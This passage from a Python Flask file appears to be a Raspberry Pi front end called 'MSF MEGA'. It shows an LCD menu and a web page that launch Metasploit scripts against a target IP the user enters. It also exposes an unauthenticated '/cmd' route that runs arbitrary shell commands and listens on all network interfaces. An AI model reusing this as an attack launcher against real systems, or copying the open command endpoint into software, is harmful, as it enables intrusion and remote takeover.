        if (!rhosts) {
            alert('Enter target IP (RHOSTS)');
            return;
        }
        const outputDiv = document.getElementById('output');
        outputDiv.innerText = 'Running script... please wait.';
        fetch('/run', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                script_path: selectedPath,
                lhost: lhost,
                rhosts: rhosts
            })
        })
        .then(r => r.json())
        .then(data => {
            outputDiv.innerText = data.output;
        })
        .catch(err => {
            outputDiv.innerText = 'Error: ' + err;
        });
    });

    // Run custom command
    document.getElementById('runCmd').addEventListener('click', () => {
        const cmd = document.getElementById('cmdInput').value;
        if (!cmd) return;
        const outputDiv = document.getElementById('cmdOutput');
        outputDiv.innerText = 'Running...';
        fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd })
        })
        .then(r => r.json())
        .then(data => {
            outputDiv.innerText = data.output;
        })
        .catch(err => {
            outputDiv.innerText = 'Error: ' + err;
        });
    });
</script>
</body>
</html>
"""

# ----------------------------------------------------------------------
# Flask routes
# ----------------------------------------------------------------------
@app.route('/')
def index():
    scripts = discover_scripts()
    lhost = get_local_ip()
    return render_template_string(HTML_TEMPLATE, scripts=scripts, lhost=lhost)

@app.route('/run', methods=['POST'])
def run():
    data = request.json
    script_path = data.get('script_path')
    lhost = data.get('lhost', get_local_ip())
    rhosts = data.get('rhosts')
    if not rhosts:
        return jsonify({'output': 'Error: RHOSTS not provided'})
    params = {'lhost': lhost, 'rhosts': rhosts}
    output = run_script(script_path, params)
    return jsonify({'output': output})

@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.json
    command = data.get('command', '')
    if not command:
        return jsonify({'output': 'No command'})
    output = run_command(command)
    return jsonify({'output': output})

# ----------------------------------------------------------------------
# LCD helpers
# ----------------------------------------------------------------------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def generate_qr(data):
    import qrcode
    qr = qrcode.QRCode(box_size=3, border=2)
    qr.add_data(data)
    return qr.make_image(fill_color="white", back_color="black").get_image()

def lcd_loop():
    if not HAS_HW:
        return
    ip = get_local_ip()
    scripts = discover_scripts()
    script_names = [s['name'] for s in scripts]
    script_idx = 0
    show_qr = False
    held = {}
    while True:
        now = time.time()
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        if show_qr:
            qr_img = generate_qr(f"http://{ip}:{PORT}")
            qr_img = qr_img.resize((W, H))
            img.paste(qr_img, (0,0))
        else:
            d.rectangle([(0,0),(128,18)], fill=(120,0,0))
            d.text((4,3), "MSF MEGA", font=font_bold, fill="#FF3333")
            y = 20
            d.text((4,y), f"IP: {ip}:{PORT}", font=font_sm, fill="#FFBBBB"); y+=12
            if script_names:
                script_name = script_names[script_idx][:18]
                d.text((4,y), f"Script: {script_name}", font=font_sm, fill="#00FF00"); y+=12
                d.text((4,y), "K2=Cycle  OK=Remind", font=font_sm, fill="#FF7777"); y+=12
            d.text((4,y), "K1=QR  K3=Exit", font=font_sm, fill="#FF7777")
            d.rectangle((0,H-12,W,H), fill="#220000")
        LCD.LCD_ShowImage(img, 0, 0)
        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
        for n, down in pressed.items():
            if down:
                if n not in held: held[n] = now
            else:
                held.pop(n, None)
        def just_pressed(name, delay=0.2):
            return pressed.get(name) and (now - held.get(name, now)) <= delay
        if just_pressed("KEY3"):
            break
        if just_pressed("KEY1"):
            show_qr = not show_qr
            time.sleep(0.3)
        if not show_qr and script_names:
            if just_pressed("KEY2"):
                script_idx = (script_idx + 1) % len(script_names)
                time.sleep(0.3)
            if just_pressed("OK"):
                d.text((4,80), "Use web UI to", font=font_sm, fill="#FF8888")
                d.text((4,92), "run scripts", font=font_sm, fill="#FF8888")
                LCD.LCD_ShowImage(img,0,0)
                time.sleep(1.5)
        time.sleep(0.1)

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    # Generate scripts if needed
    generate_scripts()

    # Check msfconsole
    if os.system("which msfconsole >/dev/null 2>&1") != 0:
        print("Metasploit not found. Please install metasploit-framework.")
        if HAS_HW:
            img = Image.new("RGB", (W,H), "black")
            d = ImageDraw.Draw(img)
            d.text((4,40), "Metasploit missing", font=font_sm, fill="red")
            d.text((4,55), "sudo apt install", font=font_sm, fill="white")
            d.text((4,70), "metasploit-framework", font=font_sm, fill="white")
            LCD.LCD_ShowImage(img,0,0)
            time.sleep(5)
        return

    if HAS_HW:
        threading.Thread(target=lcd_loop, daemon=True).start()
        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
    else:
        app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    try:
        import qrcode
    except ImportError:
        os.system("pip install qrcode pillow")
    main()
